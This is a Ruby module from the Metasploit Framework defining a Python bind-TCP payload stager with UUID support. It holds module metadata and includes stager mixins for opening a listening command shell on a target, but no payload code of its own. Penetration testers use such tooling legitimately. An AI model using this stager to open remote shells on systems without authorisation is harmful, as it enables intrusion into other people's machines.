##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/bind_tcp'
require 'msf/core/payload/python'
require 'msf/core/payload/python/bind_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module MetasploitModule

  CachedSize = 486

  include Msf::Payload::Stager
  include Msf::Payload::Python
  include Msf::Payload::Python::BindTcp

  def self.handler_type_alias
    'bind_tcp_uuid'
  end

  def initialize(info = {})
    super(merge_info(info,
      'Name'        => 'Python Bind TCP Stager with UUID Support',
      'Description' => 'Listen for a connection with UUID Support',
      'Author'      => 'OJ Reeves',
      'License'     => MSF_LICENSE,
      'Platform'    => 'python',
      'Arch'        => ARCH_PYTHON,
      'Handler'     => Msf::Handler::BindTcp,
      'Stager'      => {'Payload' => ""}
    ))
  end

  # Tell the reverse_tcp payload to include the UUID
  def include_send_uuid
    true
  end
end
